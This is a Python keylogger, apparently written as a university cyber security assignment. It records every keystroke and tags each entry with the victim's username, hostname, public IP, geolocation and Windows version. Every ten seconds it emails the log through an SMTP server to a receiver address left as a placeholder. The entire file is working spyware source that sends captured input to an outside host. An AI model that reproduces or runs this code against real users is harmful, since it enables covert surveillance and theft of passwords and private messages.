# Keylogger by B00135910 Liam McDonnell - TU863 Digital Forensics & Cyber Security

import os # Import os to use OS specific functionalities.
import time # Import time for time functions and delays.
import getpass # Import getpass to retrieve sensitive system information without displaying it.
import requests # Import requests to interact with APIs.
import threading # Import threading to manage threads and multiple operations to run simultaneously.
import logging # Import logging module to log messages.
import smtplib # Import smtplib module to send emails from this script.
from pynput.keyboard import Key, Listener # Import pynput for keyboard input.
from email.mime.multipart import MIMEMultipart # Import MIMEMultipart for handling email creation.
from email.mime.text import MIMEText # Import MIMEText to create text-based emails.
from email.mime.base import MIMEBase # Import MIMEBase to handle files in emails.
from email import encoders # Import encoders for handling media over email protocol. 
import socket #Import socket for script to communicate with protocols.
import platform  # Import platform module to get Windows Version.

# Function to grab the Public IP Address.
def get_public_ip():
    # Grab the public IP address from an external request to ipify.
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unavailable"

# Function to grab locaion information using the Public IP Address.
def get_location(ip_address):
    # Retrieve the Geo-Location through IPinfo API using the Public IP Address.
    api_key = "ENTER API KEY HERE"  # IPinfo API Key
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json?token={api_key}')
        data = response.json()
        return f"{data['city']}, {data['country']}"
    except requests.RequestException:
        return "Location Unavailable"

# Grab the Windows Username & Hostname of machine.
user_name = getpass.getuser()
host_name = socket.gethostname()

# Grab the Public IP Address & Location.
public_ip = get_public_ip()
location = get_location(public_ip)

# Grab the Windows Version.
windows_version = platform.version()

# Logging format to include Device User, Public IP Address, Location, Hostname and Windows Version in each new log.
logging.basicConfig(filename="Logged_Keys.log", level=logging.INFO,
                    format=f'%(asctime)s: %(message)s USER={user_name} HOSTNAME={host_name} IP={public_ip} LOCATION={location} WINDOWS_VERSION={windows_version}')

# Function to log key press events
def on_press(key):
    #Log key press events. Handles exceptions for special keys without a char attribute.
    try:
        logging.info(f"Key pressed: {getattr(key, 'char', key)}")
    except Exception as e:
        logging.error(f"Error logging key press: {str(e)}")

# Function to handle email sending with log file attachment.
def send_email_via_ses_with_attachment():
    # Send an email, with log file attached in 10 second intervals.
    while True:
        smtp_username = "ENTER USERNAME HERE"
        smtp_password = "ENTER PASSWORD HERE"
        smtp_server = "ENTER SERVER HERE"
        port = 587

        # Setup the email.
        sender_email = "ENTER SENDER EMAIL"
        receiver_email = "ENTER RECEIVER EMAIL"
        subject = "Logged Keystrokes"
        body = "Hello, your logged keystrokes are attached to this email."

        # Creating the email.
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Attaching the log file
        filename = r"C:\Users\liamm\OneDrive\Desktop\Logged_Keys.log"
        with open(filename, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment", filename=os.path.basename(filename))
        message.attach(part)

        # Connecting to SMTP server & sending the email.
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        print("Logs sent successfully via email.")
        time.sleep(10)  # Sleep for 10 seconds before sending the next email.

# Main code execution block.
if __name__ == "__main__":
    # Running the email thread in parallel to the key listener.
    email_thread = threading.Thread(target=send_email_via_ses_with_attachment)
    email_thread.start()
    # Starting the keyboard listener.
    with Listener(on_press=on_press) as listener:
        listener.join()
    # Ensuring the email thread is properly closed when the listener stops.
    email_thread.join()